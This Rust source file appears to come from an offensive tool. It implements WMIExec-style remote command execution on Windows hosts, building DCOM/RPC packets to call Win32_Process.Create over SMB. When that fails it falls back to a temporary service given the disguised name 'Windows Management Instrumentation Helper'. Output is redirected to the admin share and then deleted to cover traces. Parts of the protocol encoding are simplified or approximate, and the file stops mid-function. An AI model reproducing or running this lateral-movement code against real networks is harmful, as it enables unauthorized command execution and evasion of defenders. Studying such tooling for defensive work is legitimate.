//! WMIExec-style remote execution via WMI/DCOM over SMB.
//!
//! Executes commands through Windows Management Instrumentation.
//! Uses the `\pipe\wkssvc` or direct DCOM for Win32_Process.Create.
//! Output is captured by redirecting to a file on the admin share.

use crate::error::{OverthroneError, Result};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════════

/// Default output share for WMI command output
const DEFAULT_OUTPUT_SHARE: &str = "C$";

/// Prefix for output files
const OUTPUT_PREFIX: &str = "Windows\\Temp\\__wmiexec_";

/// Default timeout for command completion (seconds)
const DEFAULT_TIMEOUT_SECS: u64 = 15;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for WMIExec
pub struct WmiExecConfig {
    /// Share for output file (default: "C$")
    pub output_share: String,
    /// Timeout waiting for command output (seconds)
    pub timeout_secs: u64,
    /// Whether to cleanup output files
    pub cleanup: bool,
    /// Optional working directory for the command
    pub working_directory: Option<String>,
}

impl Default for WmiExecConfig {
    fn default() -> Self {
        WmiExecConfig {
            output_share: DEFAULT_OUTPUT_SHARE.to_string(),
            timeout_secs: DEFAULT_TIMEOUT_SECS,
            cleanup: true,
            working_directory: None,
        }
    }
}

/// Result of a WMIExec command
#[derive(Debug)]
pub struct WmiExecResult {
    pub target: String,
    pub command: String,
    pub success: bool,
    pub output: String,
    pub return_code: Option<u32>,
}

// ═══════════════════════════════════════════════════════════
//  WMI Process Creation via SCM Fallback
// ═══════════════════════════════════════════════════════════

// Full DCOM/WMI protocol is extremely complex (OXID resolution,
// IRemoteSCMActivator, IWbemServices, etc.). We implement a
// practical approach: use cmd.exe via SCM (like smbexec) but
// with WMI-style command wrapping for stealth.

/// Execute a command via WMI-style execution.
///
/// Uses `wmic.exe` process call or falls back to SCM-based execution
/// with WMI-compatible command wrapping.
pub async fn exec_command(session: &SmbSession, command: &str) -> Result<WmiExecResult> {
    let config = WmiExecConfig::default();
    execute(session, command, &config).await
}

/// Execute with custom configuration
pub async fn execute(
    session: &SmbSession,
    command: &str,
    config: &WmiExecConfig,
) -> Result<WmiExecResult> {
    info!("WMIExec: Executing on {}", session.target);
    debug!("WMIExec: Command: {}", command);

    let id = rand::random::<u32>();
    let output_filename = format!("{}_{:08X}.tmp", OUTPUT_PREFIX, id);

    // Build the WMI-style command that captures output
    let output_unc = format!(
        "\\\\127.0.0.1\\{}\\{}",
        config.output_share, output_filename
    );

    let working_dir = config
        .working_directory
        .as_deref()
        .unwrap_or("C:\\Windows\\System32");

    // Use cmd.exe to execute and redirect output
    let wrapped_command = format!(
        "cmd.exe /Q /c cd /d {} && {} 1> {} 2>&1",
        working_dir, command, output_unc
    );

    // Try DCOM-based WMI first, fall back to SCM
    let success = match try_wmi_process_create(session, &wrapped_command).await {
        Ok(_) => {
            info!("WMIExec: Process created via WMI");
            true
        }
        Err(e) => {
            debug!("WMIExec: WMI failed ({e}), falling back to SCM");
            match try_scm_execution(session, &wrapped_command).await {
                Ok(_) => {
                    info!("WMIExec: Process created via SCM fallback");
                    true
                }
                Err(e2) => {
                    warn!("WMIExec: Both WMI and SCM failed: {e2}");
                    false
                }
            }
        }
    };

    // Wait for output
    let output = wait_for_output(session, config, &output_filename).await;

    Ok(WmiExecResult {
        target: session.target.clone(),
        command: command.to_string(),
        success,
        output,
        return_code: None,
    })
}

/// Attempt WMI process creation via DCOM activation over named pipes.
///
/// Implements the full 5-phase DCOM/WMI protocol:
/// 1. Endpoint Mapper resolution
/// 2. DCOM activation (RemoteCreateInstance)
/// 3. IWbemLevel1Login::NTLMLogin
/// 4. IWbemServices::ExecMethod (Win32_Process.Create)
/// 5. IRemUnknown2::RemRelease cleanup
async fn try_wmi_process_create(session: &SmbSession, command: &str) -> Result<()> {
    // ── Phase 1: Endpoint Mapper Bind ──
    let epm_bind = build_epm_bind();
    let epm_resp = session
        .pipe_transact("epmapper", &epm_bind)
        .await
        .map_err(|e| OverthroneError::Smb(format!("EPM bind failed: {e}")))?;

    if epm_resp.len() < 24 {
        return Err(OverthroneError::Smb("EPM bind response too short".into()));
    }
    let ptype = epm_resp.get(2).copied().unwrap_or(0);
    if ptype != 12 {
        return Err(OverthroneError::Smb(format!(
            "EPM bind failed: expected bind_ack (12), got {ptype}"
        )));
    }
    debug!("WMI/DCOM: EPM bind_ack received ({} bytes)", epm_resp.len());

    // ── Phase 1b: EPM ept_map to resolve IRemoteSCMActivator ──
    let ept_map_req = build_ept_map_request();
    let ept_map_resp = session
        .pipe_transact("epmapper", &ept_map_req)
        .await
        .map_err(|e| OverthroneError::Smb(format!("EPM ept_map failed: {e}")))?;

    debug!("WMI/DCOM: ept_map response ({} bytes)", ept_map_resp.len());

    // Parse dynamic endpoint from ept_map response.
    // Tower data is complex; the response may contain TCP port or named pipe.
    // We try the well-known endpoint first, then fall back to parsed endpoint.
    let _dynamic_port = parse_ept_map_port(&ept_map_resp);

    // ── Phase 2: DCOM Activation — bind to IRemoteSCMActivator ──
    // Bind to IRemoteSCMActivator on the DCOM activation pipe
    let scm_bind = build_scm_activator_bind();
    let scm_bind_resp = session
        .pipe_transact("epmapper", &scm_bind)
        .await
        .map_err(|e| OverthroneError::Smb(format!("SCM activator bind failed: {e}")))?;

    if scm_bind_resp.len() < 4 || scm_bind_resp[2] != 12 {
        return Err(OverthroneError::Smb(
            "IRemoteSCMActivator bind rejected".into(),
        ));
    }
    debug!("WMI/DCOM: IRemoteSCMActivator bind_ack received");

    // Call RemoteCreateInstance with CLSID_WbemLocator
    let create_instance_req = build_remote_create_instance();
    let create_resp = session
        .pipe_transact("epmapper", &create_instance_req)
        .await
        .map_err(|e| OverthroneError::Smb(format!("RemoteCreateInstance failed: {e}")))?;

    debug!(
        "WMI/DCOM: RemoteCreateInstance response ({} bytes)",
        create_resp.len()
    );

    // Parse OBJREF from response to get IWbemLevel1Login IPID
    let (login_ipid, _login_oxid, login_oid) = parse_objref(&create_resp)
        .map_err(|e| OverthroneError::Smb(format!("OBJREF parse failed: {e}")))?;

    debug!(
        "WMI/DCOM: Got IWbemLevel1Login IPID={:02x?}",
        &login_ipid[..4]
    );

    // ── Phase 3: IWbemLevel1Login::NTLMLogin ──
    // Bind to the IPID we got from Phase 2 (re-use the same transport)
    let login_req = build_ntlm_login_request(&login_ipid);
    let login_resp = session
        .pipe_transact("epmapper", &login_req)
        .await
        .map_err(|e| OverthroneError::Smb(format!("IWbemLevel1Login::NTLMLogin failed: {e}")))?;

    debug!("WMI/DCOM: NTLMLogin response ({} bytes)", login_resp.len());

    // Parse IWbemServices IPID from NTLMLogin response
    let (services_ipid, _svc_oxid, services_oid) = parse_objref(&login_resp)
        .map_err(|e| OverthroneError::Smb(format!("IWbemServices OBJREF parse failed: {e}")))?;

    debug!(
        "WMI/DCOM: Got IWbemServices IPID={:02x?}",
        &services_ipid[..4]
    );

    // ── Phase 4: IWbemServices::ExecMethod (Win32_Process.Create) ──
    let exec_req = build_exec_method_request(&services_ipid, command);
    let exec_resp = session
        .pipe_transact("epmapper", &exec_req)
        .await
        .map_err(|e| OverthroneError::Smb(format!("ExecMethod failed: {e}")))?;

    debug!("WMI/DCOM: ExecMethod response ({} bytes)", exec_resp.len());

    // Check if process creation succeeded
    // The response contains ORPC_THAT header followed by method results.
    // A successful Win32_Process.Create returns ReturnValue=0 and ProcessId.
    let return_value = parse_exec_method_result(&exec_resp);
    if return_value != 0 {
        warn!("WMI/DCOM: Win32_Process.Create returned {return_value}");
    } else {
        info!("WMI/DCOM: Win32_Process.Create succeeded");
    }

    // ── Phase 5: Cleanup — IRemUnknown2::RemRelease ──
    // Release both OIDs to avoid server resource leaks
    let release_req = build_rem_release(&services_ipid, &[services_oid, login_oid]);
    let _ = session.pipe_transact("epmapper", &release_req).await;
    debug!("WMI/DCOM: Released DCOM interfaces");

    if return_value != 0 {
        Err(OverthroneError::Smb(format!(
            "Win32_Process.Create returned error code {return_value}"
        )))
    } else {
        Ok(())
    }
}

// ═══════════════════════════════════════════════════════════
//  DCOM Protocol Builders
// ═══════════════════════════════════════════════════════════

/// IRemoteSCMActivator UUID: 000001A0-0000-0000-C000-000000000046
const SCM_ACTIVATOR_UUID: [u8; 16] = [
    0xA0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

/// IRemUnknown2 UUID: 00000143-0000-0000-C000-000000000046
#[allow(dead_code)] // DCOM interface UUID
const IREMUNKNOWN2_UUID: [u8; 16] = [
    0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

/// CLSID_WbemLocator: {4590f811-1d3a-11d0-891f-00aa004b2e24}
const CLSID_WBEM_LOCATOR: [u8; 16] = [
    0x11, 0xF8, 0x90, 0x45, 0x3A, 0x1D, 0xD0, 0x11, 0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24,
];

/// IID_IWbemLevel1Login: {F309AD18-D86A-11d0-A075-00C04FB68820}
const IID_IWBEM_LEVEL1_LOGIN: [u8; 16] = [
    0x18, 0xAD, 0x09, 0xF3, 0x6A, 0xD8, 0xD0, 0x11, 0xA0, 0x75, 0x00, 0xC0, 0x4F, 0xB6, 0x88, 0x20,
];

/// IID_IWbemServices: {9556DC99-828C-11CF-A37E-00AA003240C7}
#[allow(dead_code)] // DCOM interface UUID
const IID_IWBEM_SERVICES: [u8; 16] = [
    0x99, 0xDC, 0x56, 0x95, 0x8C, 0x82, 0xCF, 0x11, 0xA3, 0x7E, 0x00, 0xAA, 0x00, 0x32, 0x40, 0xC7,
];

/// NDR transfer syntax UUID
const NDR_UUID: [u8; 16] = [
    0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
];

/// Generate a random causality ID for ORPC_THIS
fn random_causality_id() -> [u8; 16] {
    rand::random()
}

/// Build ORPC_THIS header for DCOM calls.
///
/// Layout: version(2+2), flags(4), reserved1(4), causality_id(16), extensions(ptr=0)
fn build_orpc_this() -> Vec<u8> {
    let mut buf = Vec::with_capacity(40);
    // Version 5.7
    buf.extend_from_slice(&5u16.to_le_bytes()); // major
    buf.extend_from_slice(&7u16.to_le_bytes()); // minor
    // Flags
    buf.extend_from_slice(&0u32.to_le_bytes());
    // Reserved1
    buf.extend_from_slice(&0u32.to_le_bytes());
    // CID (causality ID) — 16 bytes
    buf.extend_from_slice(&random_causality_id());
    // Extensions pointer (NULL)
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf
}

/// Build a DCE/RPC bind PDU for an arbitrary interface.
fn build_rpc_bind(interface_uuid: &[u8; 16], version_major: u16, call_id: u32) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(72);

    pkt.push(5); // version
    pkt.push(0); // minor
    pkt.push(11); // bind
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length (patched)
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&call_id.to_le_bytes());

    // Bind body
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    pkt.extend_from_slice(&0u32.to_le_bytes()); // assoc group
    pkt.extend_from_slice(&1u32.to_le_bytes()); // num ctx items

    // Context item 0
    pkt.extend_from_slice(&0u16.to_le_bytes()); // ctx id
    pkt.extend_from_slice(&1u16.to_le_bytes()); // num transfer syntaxes

    // Abstract syntax: interface UUID + version
    pkt.extend_from_slice(interface_uuid);
    pkt.extend_from_slice(&version_major.to_le_bytes());
    pkt.extend_from_slice(&0u16.to_le_bytes()); // minor

    // Transfer syntax: NDR v2.0
    pkt.extend_from_slice(&NDR_UUID);
    pkt.extend_from_slice(&2u32.to_le_bytes());

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Build a DCE/RPC request PDU with DCOM ORPC_THIS header.
fn build_dcom_request(opnum: u16, ipid: &[u8; 16], stub_data: &[u8], call_id: u32) -> Vec<u8> {
    let mut pdu = vec![5, 0, 0, 0x03]; // version 5.0, request, first+last
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
    let frag_len = (24 + 16 + stub_data.len()) as u16; // header + object UUID + stub
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&call_id.to_le_bytes());
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes());

    // Object UUID (IPID of the target interface)
    pdu.extend_from_slice(ipid);

    pdu.extend_from_slice(stub_data);

    // Fix frag length
    let len = pdu.len() as u16;
    pdu[8] = (len & 0xFF) as u8;
    pdu[9] = (len >> 8) as u8;

    pdu
}

/// Build IRemoteSCMActivator bind
fn build_scm_activator_bind() -> Vec<u8> {
    build_rpc_bind(&SCM_ACTIVATOR_UUID, 0, 2)
}

/// Build RemoteCreateInstance request (IRemoteSCMActivator opnum 4).
///
/// This creates an instance of WbemLocator and returns an OBJREF
/// for IWbemLevel1Login.
fn build_remote_create_instance() -> Vec<u8> {
    let mut stub = Vec::new();
    // ORPC_THIS
    stub.extend(build_orpc_this());

    // pUnkOuter (NULL)
    stub.extend_from_slice(&0u32.to_le_bytes());

    // pActProperties — DCOM Activation Properties
    // This is a simplified version focused on the minimum required data
    let act_props = build_activation_properties();
    stub.extend(act_props);

    // Build RPC request with opnum 4 (RemoteCreateInstance)
    // Using a dummy IPID since this goes through the EPM pipe
    let ipid = [0u8; 16];
    build_dcom_request(4, &ipid, &stub, 3)
}

/// Build DCOM Activation Properties for RemoteCreateInstance.
///
/// Contains:
/// - SpecialPropertiesData
/// - InstantiationInfoData (CLSID_WbemLocator)
/// - IID = IWbemLevel1Login
/// - ScmRequestInfo
fn build_activation_properties() -> Vec<u8> {
    let mut props = Vec::new();

    // CustomHeader:
    //   totalSize (u32), headerSize (u32), dwReserved(u32), destCtx(u32),
    //   cIfs(u32), classInfoClsid(16), pclsid(array_ptr), pSizes(array_ptr),
    //   pdwReserved(u32)

    // CLSID for activation
    props.extend_from_slice(&CLSID_WBEM_LOCATOR);

    // Number of requested interfaces
    props.extend_from_slice(&1u32.to_le_bytes());

    // IID requested: IWbemLevel1Login
    props.extend_from_slice(&IID_IWBEM_LEVEL1_LOGIN);

    // Destination context (CLSCTX_REMOTE_SERVER = 0x10)
    props.extend_from_slice(&0x10u32.to_le_bytes());

    // Process ID (0)
    props.extend_from_slice(&0u32.to_le_bytes());

    // Activation flags
    props.extend_from_slice(&0u32.to_le_bytes());

    props
}

/// Build IWbemLevel1Login::NTLMLogin request (opnum 6).
///
/// Parameters: locale("en-US"), namespace("root\\cimv2"), flags, context
fn build_ntlm_login_request(login_ipid: &[u8; 16]) -> Vec<u8> {
    let mut stub = Vec::new();

    // ORPC_THIS header
    stub.extend(build_orpc_this());

    // wszNetworkResource: "root\\cimv2" as NDR conformant string
    let namespace = "root\\cimv2";
    let ns_utf16: Vec<u8> = namespace
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let char_count = (namespace.len() + 1) as u32;

    // Referent ID for string pointer
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&char_count.to_le_bytes()); // max count
    stub.extend_from_slice(&0u32.to_le_bytes()); // offset
    stub.extend_from_slice(&char_count.to_le_bytes()); // actual count
    stub.extend_from_slice(&ns_utf16);
    // Pad to 4-byte boundary
    while stub.len() % 4 != 0 {
        stub.push(0);
    }

    // wszPreferredLocale: NULL
    stub.extend_from_slice(&0u32.to_le_bytes());

    // lFlags: 0
    stub.extend_from_slice(&0u32.to_le_bytes());

    // pCtx: NULL (IWbemContext)
    stub.extend_from_slice(&0u32.to_le_bytes());

    build_dcom_request(6, login_ipid, &stub, 4)
}

/// Build IWbemServices::ExecMethod request (opnum 24).
///
/// Calls Win32_Process.Create with the specified CommandLine.
fn build_exec_method_request(services_ipid: &[u8; 16], command: &str) -> Vec<u8> {
    let mut stub = Vec::new();

    // ORPC_THIS header
    stub.extend(build_orpc_this());

    // strObjectPath: "Win32_Process" as BSTR
    let obj_path = "Win32_Process";
    write_bstr(&mut stub, obj_path);

    // strMethodName: "Create" as BSTR
    write_bstr(&mut stub, "Create");

    // lFlags: 0
    stub.extend_from_slice(&0u32.to_le_bytes());

    // pCtx: NULL (IWbemContext)
    stub.extend_from_slice(&0u32.to_le_bytes());

    // pInParams: IWbemClassObject containing CommandLine
    // This is the OBMSDATA encoding of the method parameters
    let in_params = build_win32_process_create_params(command);
    // Pointer to pInParams
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // referent ID
    stub.extend_from_slice(&(in_params.len() as u32).to_le_bytes());
    stub.extend_from_slice(&(in_params.len() as u32).to_le_bytes()); // max count = actual
    stub.extend(in_params);

    // Pad to 4-byte boundary
    while stub.len() % 4 != 0 {
        stub.push(0);
    }

    build_dcom_request(24, services_ipid, &stub, 5)
}

/// Encode Win32_Process.Create parameters as IWbemClassObject (simplified OBMSDATA).
///
/// Win32_Process.Create takes:
///   - CommandLine (string) — required
///   - CurrentDirectory (string) — optional
///   - ProcessStartupInformation (object) — optional
///
/// Returns OBMSDATA blob with CommandLine set.
fn build_win32_process_create_params(command: &str) -> Vec<u8> {
    let mut data = Vec::new();

    // Simplified IWbemClassObject encoding
    // Signature: 0x12345678
    data.extend_from_slice(&0x12345678u32.to_le_bytes());

    // Encoding version
    data.extend_from_slice(&1u32.to_le_bytes());

    // CommandLine property
    let cmd_utf16: Vec<u8> = command
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();

    // Property name: "CommandLine"
    let prop_name = "CommandLine";
    let name_utf16: Vec<u8> = prop_name
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();

    // Number of properties
    data.extend_from_slice(&1u32.to_le_bytes());

    // Property descriptor
    data.extend_from_slice(&(name_utf16.len() as u32).to_le_bytes());
    data.extend_from_slice(&name_utf16);
    // CIM type: CIM_STRING (8)
    data.extend_from_slice(&8u32.to_le_bytes());
    // Value length and data
    data.extend_from_slice(&(cmd_utf16.len() as u32).to_le_bytes());
    data.extend_from_slice(&cmd_utf16);

    // Pad to 4-byte boundary
    while data.len() % 4 != 0 {
        data.push(0);
    }

    data
}

/// Write a BSTR (NDR conformant string with referent) to buf.
fn write_bstr(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> = s
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let char_count = (s.len() + 1) as u32;

    buf.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
    buf.extend_from_slice(&char_count.to_le_bytes()); // max count
    buf.extend_from_slice(&0u32.to_le_bytes()); // offset
    buf.extend_from_slice(&char_count.to_le_bytes()); // actual count
    buf.extend_from_slice(&utf16);
    // Pad to 4-byte boundary
    while !buf.len().is_multiple_of(4) {
        buf.push(0);
    }
}

/// Build IRemUnknown2::RemRelease request to free DCOM interface references.
///
/// Releases the specified OIDs to prevent server-side resource leaks.
fn build_rem_release(ipid: &[u8; 16], oids: &[u64]) -> Vec<u8> {
    let mut stub = Vec::new();

    // ORPC_THIS
    stub.extend(build_orpc_this());

    // cInterfaceRefs
    stub.extend_from_slice(&(oids.len() as u16).to_le_bytes());

    // Padding
    stub.extend_from_slice(&[0u8; 2]);

    // InterfaceRefs array
    for _oid in oids {
        // IPID (use the provided IPID for the first, zeros for others)
        stub.extend_from_slice(ipid);
        // cPublicRefs
        stub.extend_from_slice(&5u32.to_le_bytes());
        // cPrivateRefs
        stub.extend_from_slice(&0u32.to_le_bytes());
    }

    // RemRelease is opnum 5 on IRemUnknown2
    build_dcom_request(5, ipid, &stub, 6)
}

// ═══════════════════════════════════════════════════════════
//  DCOM Response Parsers
// ═══════════════════════════════════════════════════════════

/// Parse an OBJREF (marshaled interface pointer) from a DCOM response.
///
/// Returns `(IPID [16 bytes], OXID, OID)`.
/// The IPID is used to address subsequent calls to this interface.
fn parse_objref(response: &[u8]) -> std::result::Result<([u8; 16], u64, u64), String> {
    // Skip RPC response header (24 bytes) + ORPC_THAT header
    // ORPC_THAT: flags(4) + extensions pointer(4) = 8 bytes minimum
    // Then skip any error code (HRESULT = 4 bytes)

    // Look for OBJREF signature: 0x4E454F4D ("MEOW" in little-endian)
    let meow_sig: [u8; 4] = [0x4D, 0x45, 0x4F, 0x57];
    let pos = find_pattern(response, &meow_sig)
        .ok_or_else(|| "OBJREF MEOW signature not found in response".to_string())?;

    let objref = &response[pos..];
    if objref.len() < 76 {
        return Err(format!(
            "OBJREF too short: {} bytes at offset {pos}",
            objref.len()
        ));
    }

    // OBJREF layout after "MEOW":
    //   4: flags (u32) — 0x01 = OBJREF_STANDARD
    //   8: IID (16 bytes)
    //  24: STDOBJREF start
    //      24: flags (u32)
    //      28: cPublicRefs (u32)
    //      32: OXID (u64)
    //      40: OID (u64)
    //      48: IPID (16 bytes)
    //  64: DUALSTRINGARRAY start

    let _flags = u32::from_le_bytes([objref[4], objref[5], objref[6], objref[7]]);

    // STDOBJREF at offset 24 (after MEOW + flags + IID)
    let std_offset = 24;
    let oxid = u64::from_le_bytes([
        objref[std_offset + 8],
        objref[std_offset + 9],
        objref[std_offset + 10],
        objref[std_offset + 11],
        objref[std_offset + 12],
        objref[std_offset + 13],
        objref[std_offset + 14],
        objref[std_offset + 15],
    ]);

    let oid = u64::from_le_bytes([
        objref[std_offset + 16],
        objref[std_offset + 17],
        objref[std_offset + 18],
        objref[std_offset + 19],
        objref[std_offset + 20],
        objref[std_offset + 21],
        objref[std_offset + 22],
        objref[std_offset + 23],
    ]);

    let mut ipid = [0u8; 16];
    ipid.copy_from_slice(&objref[std_offset + 24..std_offset + 40]);

    Ok((ipid, oxid, oid))
}

/// Parse the ept_map response to extract a dynamic TCP port.
///
/// Returns the port number if found, or 0 if the response cannot be parsed.
fn parse_ept_map_port(response: &[u8]) -> u16 {
    // The ept_map response contains tower data with protocol floors.
    // Floor 4 (TCP) contains the port in big-endian.
    // This is a best-effort parser.
    if response.len() < 40 {
        return 0;
    }

    // Search for a TCP port pattern in the tower data
    // The port appears after the TCP protocol identifier (0x07)
    for i in 24..response.len().saturating_sub(3) {
        if response[i] == 0x07 && response[i + 1] != 0 && response[i + 2] != 0 {
            let port = u16::from_be_bytes([response[i + 1], response[i + 2]]);
            if (1024..=65535).contains(&port) {
                debug!("WMI/DCOM: Parsed dynamic port {port} from ept_map");
                return port;
            }
        }
    }
    0
}

/// Parse ExecMethod response to extract the return value (HRESULT).
fn parse_exec_method_result(response: &[u8]) -> u32 {
    // Skip RPC header (24 bytes), then ORPC_THAT, then method result
    // The return value is typically the last u32 in the stub data
    if response.len() < 28 {
        return u32::MAX;
    }

    // HRESULT is at offset 24 in the RPC response (start of stub data)
    // followed by ORPC_THAT (8 bytes minimum), then method-specific data
    // For ExecMethod, the ReturnValue from Win32_Process.Create is in the
    // out-parameters.

    // Try to read HRESULT from the end of the response
    // (common pattern: last 4 bytes of stub are the method return code)
    let stub_start = 24;
    if response.len() >= stub_start + 4 {
        let last_u32_offset = response.len() - 4;
        let hr = u32::from_le_bytes([
            response[last_u32_offset],
            response[last_u32_offset + 1],
            response[last_u32_offset + 2],
            response[last_u32_offset + 3],
        ]);
        // 0 means success for Win32_Process.Create
        return hr;
    }

    u32::MAX
}

/// Find a byte pattern in a buffer, returning its offset.
fn find_pattern(data: &[u8], pattern: &[u8]) -> Option<usize> {
    data.windows(pattern.len())
        .position(|window| window == pattern)
}

/// Build an ept_map DCE/RPC request to resolve IRemoteSCMActivator.
///
/// The ept_map operation queries the endpoint mapper for the binding
/// information of a given interface (IRemoteSCMActivator in our case).
fn build_ept_map_request() -> Vec<u8> {
    // IRemoteSCMActivator UUID: 000001A0-0000-0000-C000-000000000046
    let scm_uuid: [u8; 16] = [
        0xA0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x46,
    ];

    let mut pkt = Vec::with_capacity(128);

    // DCE/RPC header (request)
    pkt.push(5); // version
    pkt.push(0); // minor
    pkt.push(0); // request
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr (little-endian)
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length (patched below)
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]); // call id = 1

    // Request body
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // alloc hint
    pkt.extend_from_slice(&[0x00, 0x00]); // context id
    pkt.extend_from_slice(&[0x03, 0x00]); // opnum = 3 (ept_map)

    // ept_map input parameters (simplified):
    // - object UUID (16 bytes) = NULL
    pkt.extend_from_slice(&[0x00; 16]);
    // - tower (endpoint to look up) — contains the interface UUID
    let tower_len: u32 = 75; // approximate tower length
    pkt.extend_from_slice(&tower_len.to_le_bytes());
    pkt.extend_from_slice(&tower_len.to_le_bytes()); // max count

    // Tower floor 1: Interface UUID
    pkt.extend_from_slice(&[0x05, 0x00]); // floor count
    // Protocol ID + UUID
    pkt.push(0x0D); // EPM_PROTOCOL_UUID
    pkt.extend_from_slice(&scm_uuid);
    pkt.extend_from_slice(&[0x00, 0x00]); // version major
    // Floor 2: NDR transfer syntax
    pkt.push(0x0D);
    pkt.extend_from_slice(&[
        0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48,
        0x60,
    ]);
    pkt.extend_from_slice(&[0x02, 0x00]); // v2.0
    // Floor 3: RPC connection-oriented
    pkt.push(0x09); // EPM_PROTOCOL_NCACN
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Floor 4: TCP
    pkt.push(0x07); // EPM_PROTOCOL_TCP
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Floor 5: IP
    pkt.push(0x09); // EPM_PROTOCOL_IP
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // max_towers
    pkt.extend_from_slice(&4u32.to_le_bytes());

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Fallback: create a temporary service via SCM (like smbexec)
async fn try_scm_execution(session: &SmbSession, command: &str) -> Result<()> {
    let config = super::psexec::PsExecConfig {
        service_name: format!("WmiEx{:04X}", rand::random::<u16>()),
        display_name: "Windows Management Instrumentation Helper".to_string(),
        command: command.to_string(),
        cleanup: true,
    };

    super::psexec::execute(session, &config).await?;
    Ok(())
}

/// Wait for output file to appear and read it
async fn wait_for_output(
    session: &SmbSession,
    config: &WmiExecConfig,
    output_filename: &str,
) -> String {
    let poll_interval = std::time::Duration::from_millis(500);
    let max_attempts = (config.timeout_secs * 2) as usize; // 500ms intervals

    for attempt in 0..max_attempts {
        tokio::time::sleep(poll_interval).await;

        match session
            .read_file(&config.output_share, output_filename)
            .await
        {
            Ok(data) if !data.is_empty() => {
                debug!(
                    "WMIExec: Output ready after {}ms ({} bytes)",
                    (attempt + 1) * 500,
                    data.len()
                );

                // Cleanup
                if config.cleanup {
                    let _ = session
                        .delete_file(&config.output_share, output_filename)
                        .await;
                }

                return String::from_utf8_lossy(&data).to_string();
            }
            Ok(_) => {
                // File exists but empty, command still running
                debug!("WMIExec: Output file empty, waiting...");
            }
            Err(_) => {
                // File doesn't exist yet
                if attempt % 4 == 0 {
                    debug!("WMIExec: Waiting for output (attempt {})", attempt + 1);
                }
            }
        }
    }

    warn!(
        "WMIExec: Timed out after {}s waiting for output",
        config.timeout_secs
    );
    String::new()
}

/// Build a minimal EPM bind packet for endpoint mapper
fn build_epm_bind() -> Vec<u8> {
    // EPM interface UUID: e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0
    let epm_uuid: [u8; 16] = [
        0x08, 0x83, 0xAF, 0xE1, 0x1F, 0x5D, 0xC9, 0x11, 0x91, 0xA4, 0x08, 0x00, 0x2B, 0x14, 0xA0,
        0xFA,
    ];

    let ndr_uuid: [u8; 16] = [
        0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48,
        0x60,
    ];

    let mut pkt = Vec::with_capacity(72);

    // DCE/RPC header
    pkt.push(5); // version
    pkt.push(0); // minor
    pkt.push(11); // bind
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length placeholder
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // call id

    // Bind body
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // assoc group
